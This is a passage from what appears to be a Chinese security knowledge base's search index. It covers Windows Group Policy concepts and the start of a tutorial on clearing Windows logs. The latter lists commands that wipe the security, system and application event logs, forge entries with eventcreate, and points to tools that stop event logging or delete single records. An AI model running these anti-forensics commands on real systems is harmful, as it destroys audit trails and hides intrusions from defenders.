https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html","title":"Event Consumer \u4e8b\u4ef6\u5904\u7406"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/","text":"Windows\u7ec4\u7b56\u7565 \u76ee\u5f55 \u7ec4\u7b56\u7565 \u672c\u5730\u7ec4\u7b56\u7565 \u57df\u7b56\u7565 NETLOGON SYSVOL GPO Default Domain Policy Default Domain Controllers Policy GPP Windows\u7ec4\u7b56\u7565\uff0c\u8001\u751f\u5e38\u8c08\u7684\u8bdd\u9898\u4e86\u3002 \u7ec4\u7b56\u7565 \u7ec4\u7b56\u7565\u662fwindows nt\u5bb6\u65cf\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u7528\u4e8e\u63a7\u5236\u7528\u6237\u8d26\u6237\u548c\u8ba1\u7b97\u673a\u8d26\u6237\u7684\u5de5\u4f5c\u73af\u5883\uff0c\u53ef\u4ee5\u96c6\u4e2d\u5316\u7ba1\u7406\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u7a0b\u5e8f\u3001\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u7528\u6237\u8bbe\u7f6e\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u4e2d\u7ec4\u7b56\u7565\uff08\u57df\u7b56\u7565\uff09\u6765\u8bbe\u7f6e\u57df\u4e2d\u6240\u6709\u673a\u5668\u672c\u5730\u7ba1\u7406\u5458\u7684\u9ed8\u8ba4\u5bc6\u7801\u3002 \u7ec4\u7b56\u7565\u5e94\u7528\u987a\u5e8f\uff1a \u9996\u5148\u5e94\u7528\u672c\u5730\u7ec4\u7b56\u7565 \u5982\u679c\u6709\u7ad9\u70b9\u7ec4\u7b56\u7565\uff0c\u5219\u5e94\u7528 \u63a5\u7740\u5e94\u7528\u57df\u7b56\u7565 \u6700\u540e\u5e94\u7528 OU \u4e0a\u7684\u7b56\u7565 \u5982\u679c\u540c\u4e00\u4e2a OU \u4e0a\u94fe\u63a5\u4e86\u591a\u4e2a GPO\uff0c\u5219\u6309\u7167\u94fe\u63a5\u987a\u5e8f\u4ece\u9ad8\u5230\u4f4e\u9010\u4e2a\u5e94\u7528 \u672c\u5730\u7ec4\u7b56\u7565 Local Group Policy\uff0c\u7f29\u5199 LGP \u6216 LocalGPO\uff0c\u662f\u7ec4\u7b56\u7565\u7684\u57fa\u7840\u7248\u672c\uff0c\u9762\u5411\u72ec\u7acb\u975e\u57df\u7684\u8ba1\u7b97\u673a\u3002 WindowsXP\u5c31\u5df2\u7ecf\u5b58\u5728\u3002\u5728 Windows Vista \u4ee5\u524d\uff0cLGP \u53ef\u4ee5\u5f3a\u5236\u65bd\u884c\u7ec4\u7b56\u7565\u5bf9\u8c61\u5230\u5355\u53f0\u672c\u5730\u8ba1\u7b97\u673a\uff0c\u4f46\u4e0d\u80fd\u5c06\u7b56\u7565\u5e94\u7528\u5230\u7528\u6237\u6216\u7ec4\u3002\u4ece Windows Vista \u5f00\u59cb\uff0cLGP \u5141\u8bb8\u672c\u5730\u7ec4\u7b56\u7565\u7ba1\u7406\u5355\u4e2a\u7528\u6237\u548c\u7ec4\uff0c\u5e76\u5141\u8bb8\u4f7f\u7528\u201cGPO Packs\u201d\u5728\u72ec\u7acb\u8ba1\u7b97\u673a\u4e4b\u95f4\u5907\u4efd\u3001\u5bfc\u5165\u548c\u5bfc\u51fa\u7ec4\u7b56\u7565\u2014\u2014\u7ec4\u7b56\u7565\u5bb9\u5668\u5305\u542b\u5bfc\u5165\u7b56\u7565\u5230\u76ee\u6807\u8ba1\u7b97\u673a\u7684\u6240\u9700\u6587\u4ef6\u3002 \u57df\u7b56\u7565 NETLOGON netlogon\u548csysvol\u90fd\u662f\u57df\u63a7\u5171\u4eab\u7ed9\u5168\u57df\u7684\u6587\u4ef6\u5939\uff0c\u57df\u4e2d\u6240\u6709\u6210\u5458\u5747\u53ef\u8bbf\u95ee\u5e76\u6267\u884c\u6b64\u6587\u4ef6\u5939\u53ca\u5176\u6240\u5c5e\u6587\u4ef6\u3002\u4ed6\u4eec\u8bb0\u5f55\u4e86\u57df\u4e2d\u4e00\u4e9b\u5fc5\u8981\u7684\u6570\u636e\u3002 NETLOGIN\u662fSYSVOL\u4e0b\u7684\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u6302\u8f7d\u4e8eSYSVOL\\domain\\SCRIPTS\uff0c\u7528\u6765\u4fdd\u5b58\u811a\u672c\u4fe1\u606f SYSVOL SYSVOL \u5305\u62ec\u767b\u5f55\u811a\u672c\uff0c\u7ec4\u7b56\u7565\u6570\u636e\uff0c\u4ee5\u53ca\u5176\u4ed6\u57df\u63a7\u6240\u9700\u8981\u7684\u57df\u6570\u636e\u3002 \u57df\u4e2d\u7528\u6237\u767b\u5f55\u65f6\uff0c\u4f1a\u9996\u5148\u5728SYSVOL\u6587\u4ef6\u5939\u67e5\u627eGPO\u548c\u542f\u52a8\u811a\u672c\u3002 GPO GPO\uff0c\u5373\u7ec4\u7b56\u7565\u5bf9\u8c61\uff0c\u662f\u7ec4\u7b56\u7565\u8bbe\u7f6e\u7684\u96c6\u5408\u3002\u901a\u4fd7\u6765\u8bf4\uff0cActive Directory\u4e2d\u7ec4\u7b56\u7565\u7684\u8bbe\u7f6e\u7ed3\u679c\u662f\u4fdd\u5b58\u5728GPO\u4e2d\u7684\u3002 \u5728AD\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u7cfb\u7edf\u4e2d\u4f1a\u9ed8\u8ba4\u5b58\u5728\u4e24\u4e2aGPO Default Domain Policy \u9ed8\u8ba4\u57df\u7b56\u7565\uff0c\u7528\u6765\u7ba1\u7406\u57df\u4e2d\u7684\u4e00\u4e9b\u5b89\u5168\u7b56\u7565\uff0c\u5982\u5bc6\u7801\u8fc7\u671f\u548c\u8d26\u6237\u9501\u5b9a\u7b49\u7b49\uff0c\u5b83\u7684GUID\uff08\u552f\u4e00ID\uff09\u4e3a31B2F340-016D-11D2-945F-00C04FB984F9 Default Domain Controllers Policy \u9ed8\u8ba4\u57df\u63a7\u5236\u5668\u7b56\u7565\uff0c\u7528\u4e8e\u7ba1\u7406Domain Controllers\u5bb9\u5668\uff0cGUID\uff1a6AC1786C-016F-11D2-945F-00C04FB984F9 GPP \u7ec4\u7b56\u7565\u9996\u9009\u9879 \u5728GPP\u51fa\u73b0\u4e4b\u524d\uff0c\u5f88\u591a\u7edf\u4e00\u7ba1\u7406\u7684\u64cd\u4f5c\u53ea\u80fd\u901a\u8fc7\u811a\u672c\u6765\u5b9e\u73b0\uff0c\u800cGPP\u65b9\u4fbf\u548c\u7b80\u5316\u4e86\u8fd9\u6837\u7684\u7ba1\u7406,GPP\u4f60\u53ef\u4ee5\u5c06\u5176\u7406\u89e3\u4e3a\u4e00\u4e2a\u529f\u80fd\u70b9,\u4f5c\u7528\u662f\u7b80\u5355\u5316\u3001\u89c4\u8303\u5316\u7ec4\u7b56\u7565\u7684\u53d1\u5e03\u548c\u4f7f\u7528","title":"Windows\u7ec4\u7b56\u7565"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#windows","text":"","title":"Windows\u7ec4\u7b56\u7565"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#_1","text":"\u7ec4\u7b56\u7565 \u672c\u5730\u7ec4\u7b56\u7565 \u57df\u7b56\u7565 NETLOGON SYSVOL GPO Default Domain Policy Default Domain Controllers Policy GPP Windows\u7ec4\u7b56\u7565\uff0c\u8001\u751f\u5e38\u8c08\u7684\u8bdd\u9898\u4e86\u3002","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#_2","text":"\u7ec4\u7b56\u7565\u662fwindows nt\u5bb6\u65cf\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u4e2a\u7279\u6027\uff0c\u7528\u4e8e\u63a7\u5236\u7528\u6237\u8d26\u6237\u548c\u8ba1\u7b97\u673a\u8d26\u6237\u7684\u5de5\u4f5c\u73af\u5883\uff0c\u53ef\u4ee5\u96c6\u4e2d\u5316\u7ba1\u7406\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u7a0b\u5e8f\u3001\u6d3b\u52a8\u76ee\u5f55\u4e2d\u7684\u7528\u6237\u8bbe\u7f6e\u3002 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u53ef\u4ee5\u901a\u8fc7\u57df\u4e2d\u7ec4\u7b56\u7565\uff08\u57df\u7b56\u7565\uff09\u6765\u8bbe\u7f6e\u57df\u4e2d\u6240\u6709\u673a\u5668\u672c\u5730\u7ba1\u7406\u5458\u7684\u9ed8\u8ba4\u5bc6\u7801\u3002 \u7ec4\u7b56\u7565\u5e94\u7528\u987a\u5e8f\uff1a \u9996\u5148\u5e94\u7528\u672c\u5730\u7ec4\u7b56\u7565 \u5982\u679c\u6709\u7ad9\u70b9\u7ec4\u7b56\u7565\uff0c\u5219\u5e94\u7528 \u63a5\u7740\u5e94\u7528\u57df\u7b56\u7565 \u6700\u540e\u5e94\u7528 OU \u4e0a\u7684\u7b56\u7565 \u5982\u679c\u540c\u4e00\u4e2a OU \u4e0a\u94fe\u63a5\u4e86\u591a\u4e2a GPO\uff0c\u5219\u6309\u7167\u94fe\u63a5\u987a\u5e8f\u4ece\u9ad8\u5230\u4f4e\u9010\u4e2a\u5e94\u7528","title":"\u7ec4\u7b56\u7565"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#_3","text":"Local Group Policy\uff0c\u7f29\u5199 LGP \u6216 LocalGPO\uff0c\u662f\u7ec4\u7b56\u7565\u7684\u57fa\u7840\u7248\u672c\uff0c\u9762\u5411\u72ec\u7acb\u975e\u57df\u7684\u8ba1\u7b97\u673a\u3002 WindowsXP\u5c31\u5df2\u7ecf\u5b58\u5728\u3002\u5728 Windows Vista \u4ee5\u524d\uff0cLGP \u53ef\u4ee5\u5f3a\u5236\u65bd\u884c\u7ec4\u7b56\u7565\u5bf9\u8c61\u5230\u5355\u53f0\u672c\u5730\u8ba1\u7b97\u673a\uff0c\u4f46\u4e0d\u80fd\u5c06\u7b56\u7565\u5e94\u7528\u5230\u7528\u6237\u6216\u7ec4\u3002\u4ece Windows Vista \u5f00\u59cb\uff0cLGP \u5141\u8bb8\u672c\u5730\u7ec4\u7b56\u7565\u7ba1\u7406\u5355\u4e2a\u7528\u6237\u548c\u7ec4\uff0c\u5e76\u5141\u8bb8\u4f7f\u7528\u201cGPO Packs\u201d\u5728\u72ec\u7acb\u8ba1\u7b97\u673a\u4e4b\u95f4\u5907\u4efd\u3001\u5bfc\u5165\u548c\u5bfc\u51fa\u7ec4\u7b56\u7565\u2014\u2014\u7ec4\u7b56\u7565\u5bb9\u5668\u5305\u542b\u5bfc\u5165\u7b56\u7565\u5230\u76ee\u6807\u8ba1\u7b97\u673a\u7684\u6240\u9700\u6587\u4ef6\u3002","title":"\u672c\u5730\u7ec4\u7b56\u7565"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#_4","text":"","title":"\u57df\u7b56\u7565"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#netlogon","text":"netlogon\u548csysvol\u90fd\u662f\u57df\u63a7\u5171\u4eab\u7ed9\u5168\u57df\u7684\u6587\u4ef6\u5939\uff0c\u57df\u4e2d\u6240\u6709\u6210\u5458\u5747\u53ef\u8bbf\u95ee\u5e76\u6267\u884c\u6b64\u6587\u4ef6\u5939\u53ca\u5176\u6240\u5c5e\u6587\u4ef6\u3002\u4ed6\u4eec\u8bb0\u5f55\u4e86\u57df\u4e2d\u4e00\u4e9b\u5fc5\u8981\u7684\u6570\u636e\u3002 NETLOGIN\u662fSYSVOL\u4e0b\u7684\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u6302\u8f7d\u4e8eSYSVOL\\domain\\SCRIPTS\uff0c\u7528\u6765\u4fdd\u5b58\u811a\u672c\u4fe1\u606f","title":"NETLOGON"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#sysvol","text":"SYSVOL \u5305\u62ec\u767b\u5f55\u811a\u672c\uff0c\u7ec4\u7b56\u7565\u6570\u636e\uff0c\u4ee5\u53ca\u5176\u4ed6\u57df\u63a7\u6240\u9700\u8981\u7684\u57df\u6570\u636e\u3002 \u57df\u4e2d\u7528\u6237\u767b\u5f55\u65f6\uff0c\u4f1a\u9996\u5148\u5728SYSVOL\u6587\u4ef6\u5939\u67e5\u627eGPO\u548c\u542f\u52a8\u811a\u672c\u3002","title":"SYSVOL"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#gpo","text":"GPO\uff0c\u5373\u7ec4\u7b56\u7565\u5bf9\u8c61\uff0c\u662f\u7ec4\u7b56\u7565\u8bbe\u7f6e\u7684\u96c6\u5408\u3002\u901a\u4fd7\u6765\u8bf4\uff0cActive Directory\u4e2d\u7ec4\u7b56\u7565\u7684\u8bbe\u7f6e\u7ed3\u679c\u662f\u4fdd\u5b58\u5728GPO\u4e2d\u7684\u3002 \u5728AD\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u7cfb\u7edf\u4e2d\u4f1a\u9ed8\u8ba4\u5b58\u5728\u4e24\u4e2aGPO","title":"GPO"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#default-domain-policy","text":"\u9ed8\u8ba4\u57df\u7b56\u7565\uff0c\u7528\u6765\u7ba1\u7406\u57df\u4e2d\u7684\u4e00\u4e9b\u5b89\u5168\u7b56\u7565\uff0c\u5982\u5bc6\u7801\u8fc7\u671f\u548c\u8d26\u6237\u9501\u5b9a\u7b49\u7b49\uff0c\u5b83\u7684GUID\uff08\u552f\u4e00ID\uff09\u4e3a31B2F340-016D-11D2-945F-00C04FB984F9","title":"Default Domain Policy"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#default-domain-controllers-policy","text":"\u9ed8\u8ba4\u57df\u63a7\u5236\u5668\u7b56\u7565\uff0c\u7528\u4e8e\u7ba1\u7406Domain Controllers\u5bb9\u5668\uff0cGUID\uff1a6AC1786C-016F-11D2-945F-00C04FB984F9","title":"Default Domain Controllers Policy"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/Windows%E7%BB%84%E7%AD%96%E7%95%A5/Windows%E7%BB%84%E7%AD%96%E7%95%A5/#gpp","text":"\u7ec4\u7b56\u7565\u9996\u9009\u9879 \u5728GPP\u51fa\u73b0\u4e4b\u524d\uff0c\u5f88\u591a\u7edf\u4e00\u7ba1\u7406\u7684\u64cd\u4f5c\u53ea\u80fd\u901a\u8fc7\u811a\u672c\u6765\u5b9e\u73b0\uff0c\u800cGPP\u65b9\u4fbf\u548c\u7b80\u5316\u4e86\u8fd9\u6837\u7684\u7ba1\u7406,GPP\u4f60\u53ef\u4ee5\u5c06\u5176\u7406\u89e3\u4e3a\u4e00\u4e2a\u529f\u80fd\u70b9,\u4f5c\u7528\u662f\u7b80\u5355\u5316\u3001\u89c4\u8303\u5316\u7ec4\u7b56\u7565\u7684\u53d1\u5e03\u548c\u4f7f\u7528","title":"GPP"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/windows%26linux%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F%E4%B8%8E%E6%B8%85%E9%99%A4/","text":"windows\\&linux\u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664 \u76ee\u5f55 title: win\\&linux \u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664 date: tags: \u7cfb\u7edf\u76f8\u5173 WINDOWS \u65e5\u5fd7 \u4e8b\u4ef6\u67e5\u770b\u5668 \u4e8b\u4ef6\u7c7b\u578b \u5220\u9664\u65e5\u5fd7 \u6e05\u7a7a\u65e5\u5fd7 \u65e5\u5fd7\u4f2a\u9020 \u6682\u505c\u65e5\u5fd7\u8bb0\u5f55 \u5355\u6761\u65e5\u5fd7\u6e05\u9664 \u5404\u65e5\u5fd7\u4f4d\u7f6e\u53ca\u624b\u52a8\u6e05\u9664 IIS \u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\uff0c\u5b89\u5168\u65e5\u5fd7\uff0c\u7cfb\u7edf\u65e5\u5fd7 ftp \u8fdc\u7a0b\u684c\u9762 \u5f7b\u5e95\u5220\u9664\u65e5\u5fd7 Cipher \u547d\u4ee4\u591a\u6b21\u8986\u5199 Format\u547d\u4ee4\u8986\u76d6\u683c\u5f0f\u5316 LINUX \u65e5\u5fd7 \u6e05\u7a7a\u65e5\u5fd7 \u66ff\u6362/\u5220\u9664\u90e8\u5206\u65e5\u5fd7 \u5f7b\u5e95\u5220\u9664 shred dd wipe Secure-Delete SSH\u9690\u8eab\u767b\u5f55 title: win\\&linux \u65e5\u5fd7\u7cfb\u7edf\u4e0e\u6e05\u9664 date: tags: \u7cfb\u7edf\u76f8\u5173 WINDOWS \u65e5\u5fd7 Windows\u65e5\u5fd7\u6709\u8bb8\u591a\u7ec6\u5206\u7c7b\uff1a windows\u4e8b\u4ef6\u65e5\u5fd7\uff0cIIS\u65e5\u5fd7\uff0cFTP\u65e5\u5fd7\uff0c\u9632\u706b\u5899\u65e5\u5fd7\u7b49\u7b49\u3002 \u4e8b\u4ef6\u67e5\u770b\u5668 windows\u7cfb\u7edf\u81ea\u5e26\u4e00\u4e2a\u53eb\u505a\u4e8b\u4ef6\u67e5\u770b\u5668\u7684\u5de5\u5177\uff0c\u5b83\u53ef\u4ee5\u5206\u6790\u6240\u6709\u7684windows\u7cfb\u7edf\u65e5\u5fd7\u3002 \u8fd0\u884c->eventvwr \u5373\u53ef\u6253\u5f00\u3002 \u5b83\u628a\u65e5\u5fd7\u5206\u4e3a\u4e86\u4e24\u79cd\uff0c\u4e00\u4e2a\u662fWINDOWS\u65e5\u5fd7\uff0c\u4e00\u4e2a\u662f\u201c\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u65e5\u5fd7\u201d \u4e8b\u4ef6\u67e5\u770b\u5668\u5185\u7f6e\u6709\u4e09\u4e2a\u6838\u5fc3\u65e5\u5fd7\u6587\u4ef6\uff1aSYSTEM,SECURITY,APPLICATION\u3002\u4ed6\u4eec\u7684\u9ed8\u8ba4\u6700\u5927\u5bb9\u91cf\u4e3a20MB. \u4e8b\u4ef6\u7c7b\u578b \u4e8b\u4ef6\u67e5\u770b\u5668\u628a\u65f6\u95f4\u5206\u7c7b\u4e3a\u4e86\u4e94\u79cd\u7c7b\u578b\uff1a \u4fe1\u606f\uff08Information\uff09 \u4fe1\u606f\u4e8b\u4ef6\u6307\u5e94\u7528\u7a0b\u5e8f\u3001\u9a71\u52a8\u7a0b\u5e8f\u6216\u670d\u52a1\u7684\u6210\u529f\u64cd\u4f5c\u7684\u4e8b\u4ef6\u3002 \u8b66\u544a\uff08Warning\uff09 \u8b66\u544a\u4e8b\u4ef6\u6307\u4e0d\u662f\u76f4\u63a5\u7684\u3001\u4e3b\u8981\u7684\uff0c\u4f46\u662f\u4f1a\u5bfc\u81f4\u5c06\u6765\u95ee\u9898\u53d1\u751f\u7684\u95ee\u9898\u3002\u4f8b\u5982\uff0c\u5f53\u78c1\u76d8\u7a7a\u95f4\u4e0d\u8db3\u6216\u672a\u627e\u5230\u6253\u5370\u673a\u65f6\uff0c\u90fd\u4f1a\u8bb0\u5f55\u4e00\u4e2a\u201c\u8b66\u544a\u201d\u4e8b\u4ef6\u3002 \u9519\u8bef\uff08Error\uff09 \u9519\u8bef\u4e8b\u4ef6\u6307\u7528\u6237\u5e94\u8be5\u77e5\u9053\u7684\u91cd\u8981\u7684\u95ee\u9898\u3002\u9519\u8bef\u4e8b\u4ef6\u901a\u5e38\u6307\u529f\u80fd\u548c\u6570\u636e\u7684\u4e22\u5931\u3002\u4f8b\u5982,\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u4e0d\u80fd\u4f5c\u4e3a\u7cfb\u7edf\u5f15\u5bfc\u88ab\u52a0\u8f7d\uff0c\u90a3\u4e48\u5b83\u4f1a\u4ea7\u751f\u4e00\u4e2a\u9519\u8bef\u4e8b\u4ef6\u3002 \u6210\u529f\u5ba1\u6838\uff08Success audit\uff09 \u6210\u529f\u7684\u5ba1\u6838\u5b89\u5168\u8bbf\u95ee\u5c1d\u8bd5\uff0c\u4e3b\u8981\u662f\u6307\u5b89\u5168\u6027\u65e5\u5fd7\uff0c\u8fd9\u91cc\u8bb0\u5f55\u7740\u7528\u6237\u767b\u5f55/\u6ce8\u9500\u3001\u5bf9\u8c61\u8bbf\u95ee\u3001\u7279\u6743\u4f7f\u7528\u3001\u8d26\u6237\u7ba1\u7406\u3001\u7b56\u7565\u66f4\u6539\u3001\u8be6\u7ec6\u8ddf\u8e2a\u3001\u76ee\u5f55\u670d\u52a1\u8bbf\u95ee\u3001\u8d26\u6237\u767b\u5f55\u7b49\u4e8b\u4ef6\uff0c\u4f8b\u5982\u6240\u6709\u7684\u6210\u529f\u767b\u5f55\u7cfb\u7edf\u90fd\u4f1a\u88ab\u8bb0\u5f55\u4e3a\u201c \u6210\u529f\u5ba1\u6838\u201d\u4e8b\u4ef6\u3002 \u5931\u8d25\u5ba1\u6838\uff08Failure audit\uff09 \u5931\u8d25\u7684\u5ba1\u6838\u5b89\u5168\u767b\u5f55\u5c1d\u8bd5\uff0c\u4f8b\u5982\u7528\u6237\u8bd5\u56fe\u8bbf\u95ee\u7f51\u7edc\u9a71\u52a8\u5668\u5931\u8d25\uff0c\u5219\u8be5\u5c1d\u8bd5\u4f1a\u88ab\u4f5c\u4e3a\u5931\u8d25\u5ba1\u6838\u4e8b\u4ef6\u8bb0\u5f55\u4e0b\u6765\u3002 \u5220\u9664\u65e5\u5fd7 Windows\u5e76\u6ca1\u6709\u76f4\u63a5\u63d0\u4f9b\u5220\u9664\u7279\u70b9\u65e5\u5fd7\u7684\u529f\u80fd\uff0c\u4e8b\u4ef6\u67e5\u770b\u5668\u4e5f\u53ea\u63d0\u4f9b\u4e86\u4e00\u4e2a\u6e05\u9664\u65e5\u5fd7\u7684\u9009\u9879\uff0c\u539f\u56e0\u662f\u65e5\u5fd7\u8bb0\u5f55\u7684ID\u662f\u8fde\u7eed\u7684\uff0c\u9ed8\u8ba4\u7684\u6392\u5e8f\u65b9\u5f0f\u662f\u4ece\u5927\u5230\u5c0f\u5f80\u4e0b\u6392\u5217\u3002 \u6e05\u7a7a\u65e5\u5fd7 \u66b4\u529b\u4e00\u70b9\uff0c\u53ef\u4ee5\u76f4\u63a5\u628a\u65e5\u5fd7\u5168\u90e8\u5220\u9664\u3002 \u5f00\u59cb\u2192\u8fd0\u884c,\u8f93\u5165 eventvwr \u8fdb\u5165\u4e8b\u4ef6\u67e5\u770b\u5668\uff0c\u53f3\u8fb9\u680f\u9009\u62e9\u6e05\u9664\u65e5\u5fd7\u3002 \u6216\u8005\u901a\u8fc7powershell\u9009\u5b9a\u65e5\u5fd7\u5220\u9664 \uff08a\uff09PowerShell -Command \"& {Clear-Eventlog -Log Application,System,Security,'windows powershell'}\" \uff08b\uff09Get-WinEvent -ListLog Application,Setup,Security -Force | % {Wevtutil.exe cl $_.Logname} \u5accpowershell\u592a\u957f\u53ef\u4ee5\u7528wevtutil wevtutil el \u5217\u51fa\u7cfb\u7edf\u4e2d\u6240\u6709\u65e5\u5fd7\u540d\u79f0 wevtutil cl system \u6e05\u7406\u7cfb\u7edf\u65e5\u5fd7 wevtutil cl application \u6e05\u7406\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7 wevtutil cl security \u6e05\u7406\u5b89\u5168\u65e5\u5fd7 \u65e5\u5fd7\u4f2a\u9020 \u53ef\u4ee5\u901a\u8fc7eventcreate\u8fd9\u4e2a\u81ea\u5e26\u5de5\u5177\u4f2a\u9020\u65e5\u5fd7\u6216\u8005\u81ea\u5b9a\u4e49\u5927\u91cf\u5783\u573e\u4fe1\u606f\u8986\u76d6\u73b0\u6709\u65e5\u5fd7\uff08\u65e5\u5fd7\u6700\u5927\u5bb9\u91cf20MB\uff09 eventcreate -l system -so administrator -t warning -d \"this is a test\" -id 500 \u6682\u505c\u65e5\u5fd7\u8bb0\u5f55 \u53ef\u4ee5\u901a\u8fc7\u5de5\u5177 https://github.com/hlldz/Invoke-Phant0m\uff0c\u6765\u4f7f\u65e5\u5fd7\u8bb0\u5f55\u7ec8\u6b62\u3002\u8fd9\u4e2a\u5de5\u5177\u4ec5\u652f\u6301X64 \u8be5\u811a\u672c\u904d\u5386\u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u8fdb\u7a0b\uff08\u4e13\u7528svchost.exe\uff09\u7684\u7ebf\u7a0b\u5806\u6808\uff0c\u5e76\u6807\u8bc6\u4e8b\u4ef6\u65e5\u5fd7\u7ebf\u7a0b\u4ee5\u6740\u6b7b\u4e8b\u4ef6\u65e5\u5fd7\u670d\u52a1\u7ebf\u7a0b\u3002\u56e0\u6b64\uff0c\u7cfb\u7edf\u5c06\u65e0\u6cd5\u6536\u96c6\u65e5\u5fd7\u3002 \u968f\u540e\u65b0\u589e\u7528\u6237\uff0c\u53d1\u73b0\u65e5\u5fd7\u4e2d\u65e0\u8bb0\u5f55\uff0c\u770b\u6765\u65e5\u5fd7\u8bb0\u5f55\u786e\u5b9e\u662f\u88ab\u7ec8\u6b62\u4e86\u3002 \u5355\u6761\u65e5\u5fd7\u6e05\u9664 https://github.com/QAX-A-Team/EventCleaner 